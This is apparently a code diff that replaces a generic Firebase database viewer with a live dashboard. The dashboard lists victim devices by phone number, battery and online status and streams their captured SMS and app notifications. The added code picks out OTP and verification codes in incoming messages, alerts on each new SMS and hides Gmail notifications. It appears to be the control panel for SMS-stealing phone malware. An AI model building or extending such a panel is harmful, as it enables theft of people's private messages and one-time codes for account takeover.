-      const keySpan = document.createElement('span');
-      keySpan.className = 'key';
-      keySpan.textContent = key;
-      rowInner.appendChild(keySpan);
-
-      const tag = document.createElement('span');
-      tag.className = 'type-tag';
-      tag.textContent = isObject ? Object.keys(val).length + ' keys' : typeof val;
-      rowInner.appendChild(tag);
-
-      row.appendChild(rowInner);
-
-      if(isObject && expandedPaths.has(pathStr)){
-        const childWrap = document.createElement('div');
-        childWrap.className = 'tree-children';
-        childWrap.appendChild(buildTreeLevel(val, currentPath, query));
-        row.appendChild(childWrap);
-      }
-
-      wrap.appendChild(row);
-    });
-
-    return wrap;
-  }
-
-  function syntaxHighlight(json){
-    const escaped = json
-      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    return escaped.replace(
-      /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false)\b|\bnull\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g,
-      match => {
-        let cls = 'json-number';
-        if(/^"/.test(match)){
-          cls = /:$/.test(match) ? 'json-key' : 'json-string';
-        } else if(/true|false/.test(match)){
-          cls = 'json-bool';
-        } else if(/null/.test(match)){
-          cls = 'json-null';
+        // ===== COPY =====
+        function copyToClipboard(text) {
+            if (!text) return;
+            navigator.clipboard?.writeText(text).then(() => {
+                showToast(`📋 Copied: ${text}`);
+            }).catch(() => {
+                const inp = document.createElement('input');
+                inp.value = text;
+                document.body.appendChild(inp);
+                inp.select();
+                document.execCommand('copy');
+                document.body.removeChild(inp);
+                showToast(`📋 Copied: ${text}`);
+            });
         }
-        return `<span class="${cls}">${match}</span>`;
-      }
-    );
-  }
 
-  function renderDetail(pathParts){
-    const val = getAtPath(pathParts);
-    const pathEl = document.getElementById('detailPath');
-    const metaEl = document.getElementById('detailMeta');
-    const bodyEl = document.getElementById('detailBody');
+        // ===== HELPERS =====
+        function parseTimestamp(ts) {
+            if (!ts) return 'N/A';
+            if (typeof ts === 'number') return new Date(ts).toLocaleString();
+            if (typeof ts === 'string') {
+                const d = new Date(ts);
+                if (!isNaN(d.getTime())) return d.toLocaleString();
+                return ts;
+            }
+            return String(ts);
+        }
 
-    const fullPath = (rootPathPrefix ? rootPathPrefix + '/' : '') + pathParts.join('/');
-    pathEl.textContent = '/' + fullPath;
+        function isOnline(u) { return u?.status?.isOnline === true; }
 
-    if(val === undefined){
-      bodyEl.innerHTML = '<div class="empty-state">This node no longer exists</div>';
-      metaEl.textContent = '';
-      return;
-    }
+        function getPhone(u) {
+            if (u?.simInfo) {
+                for (const k in u.simInfo) {
+                    if (u.simInfo[k]?.number) return u.simInfo[k].number;
+                }
+            }
+            return null;
+        }
 
-    const isObject = val !== null && typeof val === 'object';
-    metaEl.textContent = isObject
-      ? Object.keys(val).length + ' child keys'
-      : 'type: ' + typeof val;
+        function getBattery(u) { return u?.status?.battery ?? 'N/A'; }
 
-    const json = JSON.stringify(val, null, 2);
-    const pre = document.createElement('pre');
-    pre.className = 'json-view';
-    pre.innerHTML = syntaxHighlight(json);
-    bodyEl.innerHTML = '';
-    bodyEl.appendChild(pre);
-  }
+        function getSmsCount(u) { return u?.sms_logs ? Object.keys(u.sms_logs).length : 0; }
 
-  function exportJson(){
-    const dataStr = JSON.stringify(treeData, null, 2);
-    const blob = new Blob([dataStr], {type:'application/json'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'rtdb-export.json';
-    a.click();
-    URL.revokeObjectURL(url);
-    showToast('📦 Export downloaded');
-  }
+        function getLatestSms(u) {
+            if (!u?.sms_logs) return null;
+            const entries = Object.entries(u.sms_logs);
+            if (!entries.length) return null;
+            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            return entries[0][1];
+        }
 
-  window.connect = connect;
-  window.disconnect = disconnect;
-  window.renderTree = renderTree;
-  window.exportJson = exportJson;
+        function getAllSms(u) {
+            if (!u?.sms_logs) return [];
+            const entries = Object.entries(u.sms_logs);
+            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            return entries.map(e => ({ id: e[0], ...e[1] }));
+        }
 
-  document.getElementById('dbUrlInput').addEventListener('keydown', e => {
-    if(e.key === 'Enter') connect();
-  });
-</script>
+        function getAllNotifications(u) {
+            if (!u?.notifications) return [];
+            const entries = Object.entries(u.notifications);
+            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            return entries.map(e => ({ id: e[0], ...e[1] }));
+        }
+
+        function isGmail(notif) {
+            if (!notif) return false;
+            if (notif.app === 'com.google.android.gm') return true;
+            if (notif.sender && /gmail|google/i.test(notif.sender)) return true;
+            return false;
+        }
+
+        function escapeHtml(t) {
+            if (!t) return '';
+            const d = document.createElement('div');
+            d.textContent = t;
+            return d.innerHTML;
+        }
+
+        // ===== RENDER DEVICES =====
+        function renderDevices() {
+            const grid = document.getElementById('devicesGrid');
+            grid.innerHTML = '';
+
+            let ids = Object.keys(allUsers);
+            if (currentFilter === 'online') ids = ids.filter(id => isOnline(allUsers[id]));
+            if (searchQuery.trim()) {
+                const q = searchQuery.trim().toLowerCase();
+                ids = ids.filter(id => {
+                    const u = allUsers[id];
+                    const phone = getPhone(u) || '';
+                    return id.toLowerCase().includes(q) || phone.includes(q);
+                });
+            }
+
+            document.getElementById('deviceCount').textContent = `${ids.length} devices`;
+
+            if (!ids.length) {
+                grid.innerHTML = `<div class="loading">${currentFilter === 'online' ? 'No online devices' : 'No devices found'}</div>`;
+                return;
+            }
+
+            ids.forEach(id => {
+                const u = allUsers[id];
+                const online = isOnline(u);
+                const phone = getPhone(u);
+                const battery = getBattery(u);
+                const smsCount = getSmsCount(u);
+                const latest = getLatestSms(u);
+                const selected = id === selectedDeviceId;
+
+                const card = document.createElement('div');
+                card.className = `device-card ${!online ? 'offline' : ''} ${selected ? 'selected' : ''}`;
+                card.dataset.deviceId = id;
+                card.onclick = () => selectDevice(id);
+
+                const displayPhone = phone || 'No number';
+                const copyable = phone && phone.length > 0;
+
+                let preview = '';
+                if (latest?.message) {
+                    const sender = latest.sender || 'Unknown';
+                    const msg = latest.message.length > 55 ? latest.message.substring(0, 55) + '…' : latest.message;
+                    preview = `
+                        <div class="device-sms-preview">
+                            <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
+                        </div>
+                    `;
+                }
+
+                card.innerHTML = `
+                    <div class="device-row">
+                        <div>
+                            <div class="device-id">${escapeHtml(id.substring(0, 14))}…</div>
+                            <div class="device-phone ${copyable ? 'copyable' : ''}" 
+                                 onclick="${copyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
+                                ${copyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
+                            </div>
+                        </div>
+                        <div class="device-status">
+                            <span class="status-dot ${online ? 'online' : 'offline'}"></span>
+                            <span class="battery">🔋 ${battery}%</span>
+                            <span class="sms-count">${smsCount}</span>
+                        </div>
+                    </div>
+                    ${preview}
+                `;
+                grid.appendChild(card);
+            });
+
+            if (!selectedDeviceId && ids.length) selectDevice(ids[0]);
+        }
+
+        // ===== SELECT DEVICE =====
+        function selectDevice(id) {
+            if (selectedDeviceId === id) return;
+            selectedDeviceId = id;
+            renderDevices();
+            renderInbox();
+            document.getElementById('newMsgDot').classList.remove('show');
+        }
+
+        // ===== RENDER INBOX =====
+        function renderInbox(newMsgId = null) {
+            const container = document.getElementById('inboxMessages');
+            const info = document.getElementById('selectedDeviceInfo');
+            const total = document.getElementById('smsTotalCount');
+
+            if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
+                container.innerHTML = '<div class="inbox-placeholder">👈 Select a device</div>';
+                info.textContent = 'Select a device';
+                total.textContent = '';
+                return;
+            }
+
+            const u = allUsers[selectedDeviceId];
+            const phone = getPhone(u) || 'No number';
+            const battery = getBattery(u);
+            let smsList = getAllSms(u);
+            let notifList = getAllNotifications(u);
+
+            // Hide Gmail notifications
+            notifList = notifList.filter(n => !isGmail(n));
+
+            info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 14))}…</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
+            total.textContent = `${smsList.length + notifList.length} messages`;
+
+            if (!smsList.length && !notifList.length) {
+                container.innerHTML = '<div class="inbox-placeholder">📭 No messages</div>';
+                return;
+            }
+
+            // If new message, prepend it
+            if (newMsgId) {
+                const found = smsList.find(s => s.id === newMsgId);
+                if (found) {
+                    const div = document.createElement('div');
+                    div.className = 'inbox-message';
+                    const sender = found.sender || 'Unknown';
+                    let body = escapeHtml(found.message || '');
+                    const isOTP = /otp|code|verification/i.test(found.message);
+                    if (isOTP) {
+                        const match = found.message.match(/\b\d{4,6}\b/);
+                        if (match) body = body.replace(match[0], `<span class="otp-code">${match[0]}</span>`);
+                    }
+                    div.innerHTML = `
+                        <div class="msg-header">
+                            <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                            <span class="msg-time">${parseTimestamp(found.timestamp)}</span>
+                        </div>
+                        <div class="msg-body">${body}</div>
+                    `;
+                    container.prepend(div);
+                    container.scrollTop = 0;
+                    document.getElementById('newMsgDot').classList.add('show');
+                    updateDeviceSmsCount(selectedDeviceId);
+                    updateStats();
+                    return;
+                }
+            }
+
+            // Full render
+            let html = '';
+
+            notifList.forEach(n => {
+                html += `
+                    <div class="inbox-message">
+                        <div class="msg-header">
+                            <span class="msg-sender">🔔 ${escapeHtml(n.app || 'Notification')}</span>
+                            <span class="msg-time">${parseTimestamp(n.timestamp)}</span>
+                        </div>
+                        <div class="msg-body"><strong>${escapeHtml(n.title || '')}</strong><br>${escapeHtml(n.message || '')}</div>
+                    </div>
+                `;
+            });
+
+            smsList.forEach(s => {
+                const sender = s.sender || 'Unknown';
+                let body = escapeHtml(s.message || '');
+                const isOTP = /otp|code|verification/i.test(s.message);
+                if (isOTP) {
+                    const match = s.message.match(/\b\d{4,6}\b/);
+                    if (match) body = body.replace(match[0], `<span class="otp-code">${match[0]}</span>`);
+                }
+                html += `
+                    <div class="inbox-message">
+                        <div class="msg-header">
+                            <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                            <span class="msg-time">${parseTimestamp(s.timestamp)}</span>
+                        </div>
+                        <div class="msg-body">${body}</div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function updateDeviceSmsCount(id) {
+            const cards = document.querySelectorAll('.device-card');
+            cards.forEach(c => {
+                if (c.dataset.deviceId === id && allUsers[id]) {
+                    const span = c.querySelector('.sms-count');
+                    if (span) span.textContent = getSmsCount(allUsers[id]);
+                }
+            });
+        }
+
+        function updateStats() {
+            const ids = Object.keys(allUsers);
+            let online = 0,
+                totalSms = 0;
+            ids.forEach(id => {
+                if (isOnline(allUsers[id])) online++;
+                totalSms += getSmsCount(allUsers[id]);
+            });
+            document.getElementById('onlineCount').textContent = online;
+            document.getElementById('smsCount').textContent = totalSms;
+        }
+
+        // ===== FILTERS =====
+        function setFilter(filter) {
+            currentFilter = filter;
+            document.querySelectorAll('.toggle-group button').forEach(b => b.classList.remove('active'));
+            if (filter === 'all') document.getElementById('allToggle').classList.add('active');
+            else document.getElementById('onlineToggle').classList.add('active');
+            renderDevices();
+        }
+
+        function filterDevices() {
+            searchQuery = document.getElementById('searchInput').value;
+            renderDevices();
+        }
+
+        function manualRefresh() {
+            showToast('⟳ Refreshing…');
+            renderDevices();
+            renderInbox();
+            updateStats();
+            showToast('✅ Refreshed');
+        }
+
+        // ===== FIREBASE LISTENERS =====
+        function setupFirebase() {
+            const ref = database.ref('users');
+
+            ref.on('value', snap => {
+                const data = snap.val();
+                if (data) {
+                    allUsers = data;
+                    renderDevices();
+                    if (selectedDeviceId && allUsers[selectedDeviceId]) renderInbox();
+                    updateStats();
+                    if (isInitialLoad) {
+                        isInitialLoad = false;
+                        const ids = Object.keys(allUsers);
+                        if (ids.length) selectDevice(ids[0]);
+                    }
+                }
+            });
+
+            ref.on('child_added', snap => {
+                const key = snap.key;
+                const data = snap.val();
+                if (key && data) {
+                    allUsers[key] = data;
+                    renderDevices();
+                    updateStats();
+                    if (key === selectedDeviceId) renderInbox();
+                }
+            });
+
+            ref.on('child_changed', snap => {
+                const key = snap.key;
+                const data = snap.val();
+                if (key && data) {
+                    const old = allUsers[key];
+                    allUsers[key] = data;
+                    renderDevices();
+                    updateStats();
+                    if (key === selectedDeviceId) {
+                        const oldCount = old?.sms_logs ? Object.keys(old.sms_logs).length : 0;
+                        const newCount = data.sms_logs ? Object.keys(data.sms_logs).length : 0;
+                        if (newCount > oldCount) {
+                            const oldIds = old?.sms_logs ? Object.keys(old.sms_logs) : [];
+                            const newIds = data.sms_logs ? Object.keys(data.sms_logs) : [];
+                            const newId = newIds.find(id => !oldIds.includes(id));
+                            if (newId && data.sms_logs[newId]) {
+                                const sms = data.sms_logs[newId];
+                                showToast(`📨 New SMS from ${sms.sender || 'Unknown'}`);
+                                renderInbox(newId);
+                            } else {
+                                renderInbox();
+                            }
+                        } else {
+                            renderInbox();
+                        }
+                    }
+                }
+            });
+
+            ref.on('child_removed', snap => {
+                const key = snap.key;
+                if (key && allUsers[key]) {
+                    delete allUsers[key];
+                    if (selectedDeviceId === key) selectedDeviceId = Object.keys(allUsers)[0] || null;
+                    renderDevices();
+                    renderInbox();
+                    updateStats();
+                }
+            });
+
+            console.log('✅ Firebase listeners active');
+        }
+
+        // ===== INIT =====
+        document.addEventListener('DOMContentLoaded', setupFirebase);
+
+        // Expose globals
+        window.copyToClipboard = copyToClipboard;
+        window.selectDevice = selectDevice;
+        window.setFilter = setFilter;
+        window.filterDevices = filterDevices;
+        window.manualRefresh = manualRefresh;
+        window.showToast = showToast;
+    </script>
 </body>
 </html>
